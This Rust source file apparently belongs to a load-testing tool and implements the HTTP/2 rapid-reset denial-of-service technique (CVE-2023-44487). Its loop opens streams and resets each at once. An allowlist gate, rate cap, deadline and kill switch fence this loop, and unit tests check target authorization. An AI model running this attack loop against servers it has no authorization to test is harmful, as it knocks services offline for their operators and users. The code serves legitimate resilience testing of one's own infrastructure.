//! # HTTP/2 rapid-reset (CVE-2023-44487) — isolated-lab / authorized use.
//!
//! Opens HTTP/2 streams and **immediately cancels each with `RST_STREAM`** before
//! the server responds. A reset stream frees its concurrency slot instantly, so
//! the client can create server-side request work far faster than it spends —
//! the resource-asymmetry that makes this a denial-of-service class. jinrai
//! exposes it as a resilience self-test so an operator can measure whether their
//! own stack (server, proxy, CDN) is patched / rate-limited against it.
//!
//! ## Same safety boundary as the other L7 engines
//!
//! The URL host is authorized as a **datum** ([`crate::authorize_datum`]) and
//! resolved **once** to a pinned connect address ([`crate::resolve_addrs`]); the
//! HTTP/2 connection only ever goes there. `https` negotiates HTTP/2 via ALPN
//! (accept-any-cert, see [`crate::tls`]); `http` uses prior-knowledge h2c. The
//! run is bounded by `duration`, capped by the rate cap (reinterpreted as
//! *streams-reset per second*), and aborts promptly on the kill switch.

use std::net::SocketAddr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use http::{Method, Request, Uri};
use tokio::io::{AsyncRead, AsyncWrite};
use tokio::net::TcpStream;
use tokio::time::MissedTickBehavior;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::TlsConnector;

use jinrai_core::{Layer, ModuleError, RunPlan, RunReport, StressModule};
use jinrai_safety::{Authorization, AuthorizedTarget, KillSwitch};

use crate::{authorize_datum, resolve_addrs, wait_for_kill, L7Error};

/// The HTTP/2 rapid-reset engine. Holds a clone of the gate (the sole authority)
/// and the target URL.
#[derive(Debug, Clone)]
pub struct H2RapidResetEngine {
    gate: Authorization,
    url: String,
}

impl H2RapidResetEngine {
    pub fn new(gate: Authorization, url: impl Into<String>) -> Self {
        Self { gate, url: url.into() }
    }

    /// Authorize the datum (public so the CLI can fail-closed before any run).
    pub fn authorize_target(&self) -> Result<Vec<AuthorizedTarget>, L7Error> {
        Ok(vec![authorize_datum(&self.gate, &self.url)?.target])
    }

    fn prepare(&self) -> Result<Prepared, L7Error> {
        let datum = authorize_datum(&self.gate, &self.url)?;
        let addr = *resolve_addrs(&datum)?.first().expect("resolve_addrs is non-empty");
        let uri = datum
            .url
            .as_str()
            .parse::<Uri>()
            .map_err(|e| L7Error::InvalidUrl(e.to_string()))?;
        // https => TLS with ALPN "h2"; http => prior-knowledge h2c (no TLS).
        let tls = if datum.url.scheme() == "https" {
            let connector = TlsConnector::from(crate::tls::client_config(vec![b"h2".to_vec()])?);
            Some((connector, crate::tls::server_name(&datum)?))
        } else {
            None
        };
        Ok(Prepared { addr, uri, tls })
    }

    /// This primitive could not start. See [`crate::module_error`] for why the
    /// distinction between a refusal and a setup failure is kept.
    fn refusal(&self, e: L7Error) -> ModuleError {
        crate::module_error("L7 h2-rapid-reset".to_string(), e)
    }
}

struct Prepared {
    addr: SocketAddr,
    uri: Uri,
    tls: Option<(TlsConnector, ServerName<'static>)>,
}

impl StressModule for H2RapidResetEngine {
    fn layer(&self) -> Layer {
        Layer::L7
    }

    fn name(&self) -> &str {
        "l7-h2-rapid-reset"
    }

    fn execute(&mut self, plan: &RunPlan) -> Result<RunReport, ModuleError> {
        let Prepared { addr, uri, tls } = match self.prepare() {
            Ok(p) => p,
            Err(e) => return Err(self.refusal(e)),
        };

        // Rate cap: min spacing between resets. `None` => send nothing.
        let Some(interval) = plan.rate_cap.min_interval() else {
            return Ok(RunReport {
                layer_label: format!("L7 h2-rapid-reset {} (rate cap 0 — sent nothing)", self.url),
                aborted_early: false,
                ..Default::default()
            });
        };

        let rt = match tokio::runtime::Builder::new_multi_thread().enable_all().build() {
            Ok(rt) => rt,
            Err(e) => return Err(self.refusal(L7Error::Client(e.to_string()))),
        };

        let sent = Arc::new(AtomicU64::new(0));
        let errors = Arc::new(AtomicU64::new(0));
        let sent_w = sent.clone();
        let errors_w = errors.clone();
        let kill = plan.kill.clone();
        let duration = plan.duration;

        rt.block_on(async move {
            let deadline = crate::deadline_in(duration);
            let tcp = match tokio::time::timeout(Duration::from_secs(10), TcpStream::connect(addr)).await {
                Ok(Ok(s)) => s,
                _ => {
                    errors_w.fetch_add(1, Ordering::Relaxed);
                    return;
                }
            };

            match tls {
                None => drive(tcp, uri, interval, deadline, kill, sent_w, errors_w).await,
                Some((connector, server_name)) => {
                    let handshake =
                        tokio::time::timeout(Duration::from_secs(10), connector.connect(server_name, tcp));
                    let stream = match handshake.await {
                        Ok(Ok(s)) => s,
                        _ => {
                            errors_w.fetch_add(1, Ordering::Relaxed);
                            return;
                        }
                    };
                    // The server must have agreed to HTTP/2 over ALPN, else there
                    // is no h2 session to rapid-reset.
                    if stream.get_ref().1.alpn_protocol() != Some(b"h2") {
                        errors_w.fetch_add(1, Ordering::Relaxed);
                        return;
                    }
                    drive(stream, uri, interval, deadline, kill, sent_w, errors_w).await;
                }
            }
        });

        let aborted = plan.kill.is_tripped();
        Ok(RunReport {
            layer_label: format!(
                "L7 h2-rapid-reset {} ({} stream{} reset)",
                self.url,
                sent.load(Ordering::Relaxed),
                if sent.load(Ordering::Relaxed) == 1 { "" } else { "s" }
            ),
            units_sent: sent.load(Ordering::Relaxed),
            errors: errors.load(Ordering::Relaxed),
            aborted_early: aborted,
            ..Default::default()
        })
    }
}

/// Run the rapid-reset loop over an established (TCP or TLS) HTTP/2 connection:
/// perform the h2 handshake, then repeatedly open a stream and immediately reset
/// it, rate-capped, until the deadline or kill. Generic over the byte stream so
/// the same loop serves h2c (`TcpStream`) and h2-over-TLS (`TlsStream`).
async fn drive<IO>(
    io: IO,
    uri: Uri,
    interval: Duration,
    deadline: Instant,
    kill: KillSwitch,
    sent: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
) where
    IO: AsyncRead + AsyncWrite + Unpin + Send + 'static,
{
    let (mut send_request, connection) = match h2::client::handshake(io).await {
        Ok(pair) => pair,
        Err(_) => {
            errors.fetch_add(1, Ordering::Relaxed);
            return;
        }
    };
    // The connection future must be driven for frames to flush; if it ends,
    // subsequent sends fail and the loop stops.
    let conn = tokio::spawn(async move {
        let _ = connection.await;
    });

    let mut ticker = tokio::time::interval(interval);
    // Never exceed the cap: on a missed tick, delay rather than burst.
    ticker.set_missed_tick_behavior(MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = ticker.tick() => {}
            _ = wait_for_kill(kill.clone()) => break,
        }
        if kill.is_tripped() || Instant::now() >= deadline {
            break;
        }

        // Wait for a stream slot (a reset frees one immediately) — but only until
        // the run is over. A server that stops granting capacity (the very
        // mitigation this primitive probes for) would otherwise park the loop here
        // indefinitely, past `--duration` and deaf to Ctrl-C.
        send_request = tokio::select! {
            r = send_request.ready() => match r {
                Ok(sr) => sr,
                Err(_) => {
                    errors.fetch_add(1, Ordering::Relaxed);
                    break;
                }
            },
            _ = wait_for_kill(kill.clone()) => break,
            _ = tokio::time::sleep(deadline.saturating_duration_since(Instant::now())) => break,
        };
        let req = match Request::builder().method(Method::GET).uri(uri.clone()).body(()) {
            Ok(r) => r,
            Err(_) => {
                errors.fetch_add(1, Ordering::Relaxed);
                break;
            }
        };
        // Open the stream (HEADERS, no END_STREAM) then immediately RST_STREAM.
        match send_request.send_request(req, false) {
            Ok((response, mut stream)) => {
                stream.send_reset(h2::Reason::CANCEL);
                drop(response); // never await the response — this is the point
                sent.fetch_add(1, Ordering::Relaxed);
            }
            Err(_) => {
                errors.fetch_add(1, Ordering::Relaxed);
            }
        }
    }

    conn.abort();
}

#[cfg(test)]
mod tests {
    use super::*;
    use jinrai_safety::{Allowlist, KillSwitch};

    fn gate_cidrs(cidrs: &[&str]) -> Authorization {
        Authorization::new(Allowlist::from_cidrs(cidrs).unwrap(), KillSwitch::new())
    }

    #[test]
    fn authorizes_http_and_https_datums() {
        // Both schemes authorize as data; TLS/ALPN is a connect-time concern.
        for url in ["http://127.0.0.1:9/", "https://127.0.0.1:9/"] {
            let engine = H2RapidResetEngine::new(gate_cidrs(&["127.0.0.0/8"]), url);
            assert!(engine.authorize_target().is_ok(), "{url} should authorize");
        }
    }

    #[test]
    fn unauthorized_target_refused() {
        // 127.0.0.1 is not inside 10.0.0.0/8 => fail-closed.
        let engine = H2RapidResetEngine::new(gate_cidrs(&["10.0.0.0/8"]), "http://127.0.0.1:9/");
        assert!(engine.authorize_target().is_err());
    }

    #[test]
    fn name_and_layer() {
        let engine = H2RapidResetEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1:9/");
        assert_eq!(engine.name(), "l7-h2-rapid-reset");
        assert_eq!(engine.layer(), Layer::L7);
    }
}
